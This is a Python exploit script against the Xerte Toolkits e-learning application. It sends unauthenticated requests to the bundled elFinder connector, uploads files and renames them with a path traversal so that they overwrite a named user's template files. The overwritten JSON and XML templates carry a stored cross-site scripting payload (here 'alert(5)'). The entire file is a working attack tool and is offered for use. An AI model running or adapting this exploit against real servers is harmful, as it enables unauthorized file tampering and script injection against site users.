import argparse
import base64
import json
import re
import requests

def get_webroot(url: str):
    res = requests.get(url + "/setup")

    match = re.search(r'<code>(.*?)</code>', res.text)
    if match:
        return match.group(1)

def get_elfinder_id(name: str, volume_id: str = "l1"):
    base_64 = base64.b64encode(name.encode("utf-8"))
    relative_id = base_64.decode("utf-8").rstrip("=")
    return volume_id + "_" + relative_id

def create_dir(url: str, params: dict, dirname: str, root_dir_id: str) -> str:

    dir_id = get_elfinder_id(dirname)

    params["cmd"] = "mkdir"
    params["name"] = dirname
    params["target"] = root_dir_id

    res = requests.get(url, params = params, allow_redirects = False)

    if res.status_code != 302:
        raise requests.exceptions.RequestException("Failed to create directory")

    return dir_id

def upload_file(
    url: str,
    params: dict,
    filename: str,
    dir_id: str,
    payload: str) -> str:

    data = {
        "cmd": "upload",
        "target": dir_id
    }

    files = {
        "upload[]": (filename, payload, "text/plain")
    }

    res = requests.post(
        url,
        params = params,
        data = data,
        files = files,
        allow_redirects = False)

    if res.status_code != 302:
        raise requests.exceptions.RequestException("Failed to upload file")

    return get_elfinder_id(filename)

def rename_file(
    url: str,
    params: dict,
    shellname: str,
    dirname: str,
    file_id: str) -> str:

    params["cmd"] = "rename"
    params["target"] = file_id
    params["name"] = f"{dirname}/../../{shellname}"

    res = requests.get(url, params = params, allow_redirects = False)

    if res.status_code != 302:
        raise requests.exceptions.RequestException("Failed to rename file")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--webroot",
        type = str,
        help = ("Full filepath to webroot. If omitted, script will try to " +
        "retrieve webroot from application."))
    parser.add_argument(
        "--templateid",
        type = int,
        default = 1,
        help = ("The Id for the target template."))
    parser.add_argument(
        "target_user",
        type = str,
        help = 'Username of user to target.')
    parser.add_argument(
        "url",
        type = str,
        help = "Full URL to application. Ex: http://target.com/xertetoolkits")
    args = parser.parse_args()

    payload = "alert(5)"

    jsonPayload = """{"attributes":{"nodeName":"learningObject","editorVersion":"3","targetFolder":"Nottingham","name":"XSS Title","language":"en-GB","navigation":"Linear","textSize":"12","theme":"xot1","themeIcons":"false","displayMode":"fill window","responsive":"true"},"children":{"0":{"attributes":{"nodeName":"title","linkID":"PG1774302902664","name":"XSS Page","text":"","size":"30","titleVAlign":"200","titleHAlign":"center","startBtnTxt":"Start","script":"// JavaScript / jQuery\n""" + payload + """","run":"first"}}}}"""
    xmlPayload = """<?xml version="1.0"?><learningObject editorVersion="3" targetFolder="Nottingham" name="XSS2 Title" language="en-GB" navigation="Linear" textSize="12" theme="xot1" themeIcons="false" displayMode="fill window" responsive="true"><title linkID="PG1774302902664" name="XSS 2 Page 1" text="" size="30" titleVAlign="200" titleHAlign="center" startBtnTxt="Start" script="// JavaScript / jQuery&#10;""" + payload + """" run="first"/></learningObject>"""

    url = args.url.rstrip("/")

    if args.webroot is None:
        webroot = get_webroot(url)
        if webroot is None:
            print("Error: Failed to retrieve webroot from {url + '/setup'}")
            exit
    else:
        webroot = args.webroot

    webroot = webroot.rstrip("/")

    connector_url = url + "/editor/elfinder/php/connector.php"

    user_dir =  f"/USER-FILES/{args.templateid}-{args.target_user}-Nottingham/"

    full_user_dir = webroot + user_dir

    upload_url = url + user_dir

    base_params = {
        "uploadDir": full_user_dir,
        "uploadURL": upload_url}

    root_dir_id = "l1_Lw"
    dirname = "d"
    filename = "s.txt"

    dir_id = create_dir(connector_url, base_params, dirname, root_dir_id)

    file_id = upload_file(
        connector_url,
        base_params,
        filename,
        root_dir_id,
        jsonPayload)
    rename_file(connector_url, base_params, "preview.json", dirname, file_id)

    file_id = upload_file(
        connector_url,
        base_params,
        filename,
        root_dir_id,
        jsonPayload)
    rename_file(connector_url, base_params, "data.json", dirname, file_id)

    file_id = upload_file(
        connector_url,
        base_params,
        filename,
        root_dir_id,
        xmlPayload)
    rename_file(connector_url, base_params, "preview.xml", dirname, file_id)

    file_id = upload_file(
        connector_url,
        base_params,
        filename,
        root_dir_id,
        xmlPayload)
    rename_file(connector_url, base_params, "data.xml", dirname, file_id)


if __name__ == "__main__":
    main()
